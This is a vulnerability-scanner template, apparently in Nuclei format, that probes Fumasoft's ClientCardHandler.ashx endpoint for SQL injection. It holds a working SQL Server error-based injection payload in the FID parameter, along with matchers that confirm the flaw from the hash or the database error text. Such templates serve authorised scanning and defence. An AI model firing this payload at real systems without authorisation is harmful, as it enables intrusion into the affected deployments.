id: poc-yaml-fumasoft-clientcardhandler-ashx-sqli
info:
  name: 孚盟云 ClientCardHandler.ashx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /m/Dingding/Ajax/ClientCardHandler.ashx?method=getCardImage&FID=1'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - contains(body, "0x" + t2)
          - contains(body, "\"Message\":")
          - regex(body, "转换成数据类型(.*?)时失败")
          - regex(body, "在将(.*?)值")
